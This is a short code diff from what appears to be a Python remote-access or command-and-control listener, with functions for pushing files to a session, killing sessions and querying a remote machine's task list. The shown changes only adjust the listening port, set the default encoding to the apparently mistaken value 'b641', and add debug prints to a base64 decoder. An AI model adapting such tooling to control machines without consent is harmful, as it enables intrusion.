@@ -35,7 +35,7 @@ else:
 
 
 listen_addr = '0.0.0.0'
-listen_port = 18082
+listen_port = 8081
 conn = ""
 ###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT
 
@@ -233,7 +233,7 @@ def file_transfer_put(conn, commands):       #push file to server
     conn.send("[END]".encode('utf-8'))
     f.close()
 
-def listen_for_data(conn, mode="print",encoding="b64"):
+def listen_for_data(conn, mode="print",encoding="b641"):
     conn.settimeout(CONFIG['TCP_TIMEOUT'])
     try:
         if CONFIG['DEBUG']:
@@ -274,10 +274,16 @@ def kill_session(conn, source):
     conn.close()
 
 def base64_decode(base64_message):
-    base64_bytes = base64_message.encode('utf8')
-    message_bytes = base64.b64decode(base64_bytes)
-    message = message_bytes.decode('utf8')
-    return message
+    print(base64_message)
+    try:
+        base64_bytes = base64_message.encode('utf8')
+        message_bytes = base64.b64decode(base64_bytes)
+        message = message_bytes.decode('utf8')
+        return message
+    except Exception as e:
+        print(exc_info())
+        print(e)
+        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def query_for_tasklist(machine_addr):
     try:
